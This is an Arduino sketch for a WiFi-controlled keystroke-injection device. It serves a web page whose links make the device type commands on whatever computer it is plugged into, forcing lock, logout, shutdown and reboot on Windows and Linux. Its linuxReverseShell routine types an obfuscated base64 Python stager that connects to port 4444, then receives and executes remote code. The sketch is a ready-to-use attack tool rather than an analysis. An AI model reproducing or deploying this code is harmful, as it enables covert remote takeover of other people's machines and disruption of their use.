#include <SPI.h>
#include <WiFi101.h>
#include "Keyboard.h"

char ssid[] = "your_essid"; 
char pass[] = "your_password";
int keyIndex = 0;      
int ledpin = 6;
bool val = true;

int status = WL_IDLE_STATUS;
WiFiServer server(80);

void setup() {
  Serial.begin(9600);  
  Keyboard.begin();  
  Serial.print("Start Serial ");
  pinMode(ledpin, OUTPUT); 
  Serial.print("WiFi101 shield: ");
  if (WiFi.status() == WL_NO_SHIELD) {
    Serial.println("NOT PRESENT");
    return; // don't continue
  }
  Serial.println("DETECTED");
  
  while ( status != WL_CONNECTED) {
    digitalWrite(ledpin, LOW);
    Serial.print("Attempting to connect to Network named: ");
    Serial.println(ssid);                
    digitalWrite(ledpin, HIGH);
    status = WiFi.begin(ssid, pass);
    delay(10000);
  }
  server.begin();                          
  printWifiStatus();                      
  digitalWrite(ledpin, HIGH);
}
void loop() {
  WiFiClient client = server.available();  

  if (client) {                           
    Serial.println("new client");       
    String currentLine = "";              
    while (client.connected()) 
    {       
      if (client.available()) 
      {           
        char c = client.read();          
        Serial.write(c);                 
        if (c == '\n') 
        {                 

            if (currentLine.length() == 0) {
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println();
            client.print("www.greenterminal.in<br>");
            client.print("<br>");
            client.print("<h1>Windows<br>");
            client.print("<br>");
            client.print("<h1>Click <a href=\"/WT\">here</a> To Test<br>");
            client.print("Click <a href=\"/L\">here</a> To Lock Computer<br>");
            client.print("Click <a href=\"/WL\">here</a> To Logout<br>");
            client.print("Click <a href=\"/WS\">here</a> To Shutdown<br>");
            client.print("Click <a href=\"/WW\">here</a> To Change Wallpaper (Coming Soon...)<br>");
            client.print("Click <a href=\"/WRS\">here</a> Launch Reverse Shell (Coming Soon...)<br>");

            client.print("<br>");
            client.print("Linux<br>");
            client.print("<br>");
            client.print("Click <a href=\"/KT\">here</a> To Test<br>");
            client.print("Click <a href=\"/L\">here</a> To Lock<br>");
            client.print("Click <a href=\"/KL\">here</a> To Logout<br>");
            client.print("Click <a href=\"/KPD\">here</a> To Shutdown<br>");
            client.print("Click <a href=\"/KR\">here</a> To Reboot<br>");
            client.print("Click <a href=\"/RS\">here</a> To Launch Reverse Shell<br></h1>");
            client.println();
            break;
          }
          else {   
            currentLine = "";
          }
        }
        else if (c != '\r') {   
          currentLine += c;   
        }


//Windows
        
        if (currentLine.endsWith("GET /WT")) {
          winTest();         
        }
        else if (currentLine.endsWith("GET /L")) {
          lockDevice();         
        }
        else if (currentLine.endsWith("GET /WL")) {
          winLogoff();         
        }
        else if (currentLine.endsWith("GET /WS")) {
          shutdownDevice();         
        }
//Linux
        else if (currentLine.endsWith("GET /KT")) 
        {
          linuxTest();       
        }
        else if (currentLine.endsWith("GET /KPD")) 
        {
          linuxPoweroff();   
        }
        else if (currentLine.endsWith("GET /KL")) 
        {
          linuxLogout();   
        }
       else if (currentLine.endsWith("GET /KR")) 
        {
          linuxReboot();   
        }
               else if (currentLine.endsWith("GET /RS")) 
        {
          linuxReverseShell();   
        }
      }
    }

    client.stop();
    Serial.println("client disonnected");
  }
}

void printWifiStatus() 
{

  Serial.print("SSID: ");
  Serial.println(WiFi.SSID());
 
  IPAddress ip = WiFi.localIP();
  Serial.print("IP Address: ");
  Serial.println(ip);
 
  long rssi = WiFi.RSSI();
  Serial.print("signal strength (RSSI):");
  Serial.print(rssi);
  Serial.println(" dBm");
  // print where to go in a browser:
  Serial.print("To see this page in action, open a browser to http://");
  Serial.println(ip);
}


void winTest()
{     Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);     
      delay(500);
      Keyboard.println("notepad");
      delay(2000);
      Keyboard.write(KEY_RETURN);
      delay(1000);
      Keyboard.println("HID Test For Windows");
}
void changeWallpaper()
{
//Coming Soon
}
void lockDevice()
{
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('l');
      Keyboard.releaseAll();
      delay(50);
}
void winLogoff()
{
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);     
      delay(500);
      Keyboard.println("shutdown -l");
      delay(50);
      Keyboard.write(KEY_RETURN);
      Keyboard.releaseAll();
      delay(1000);
}

void shutdownDevice()
{

      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);     
      delay(500);
      Keyboard.println("shutdown -t 0 -f -s");
      delay(50);
      Keyboard.write(KEY_RETURN);
      Keyboard.releaseAll();
      delay(1000);
}

void linuxTest()
{
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(3000);
      Keyboard.println("Linux HID TEST");
}
void linuxPoweroff()
{
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(3000);
      Keyboard.println("poweroff");
      delay(50);
      Keyboard.write(KEY_RETURN);
}
void linuxReboot()
{
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(3000);
      Keyboard.println("reboot");
      delay(50);
      Keyboard.write(KEY_RETURN);
}
void linuxLogout()
{
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(3000);
      Keyboard.println("gnome-session-quit");
      delay(1000);
      Keyboard.write(KEY_RETURN);
      delay(50);
      Keyboard.write(KEY_RETURN);
}
void linuxReverseShell()
{
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(3000);
      Keyboard.println("python");
      delay(100);
      Keyboard.write(KEY_RETURN);
      delay(1000);
      Keyboard.println("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))");
      delay(500);
      Keyboard.write(KEY_RETURN);
      delay(500);
      Keyboard.println("exit()");
      delay(500);
      Keyboard.write(KEY_RETURN);
      delay(50);
      Keyboard.println("exit");
      Keyboard.write(KEY_RETURN);
      delay(50);

}



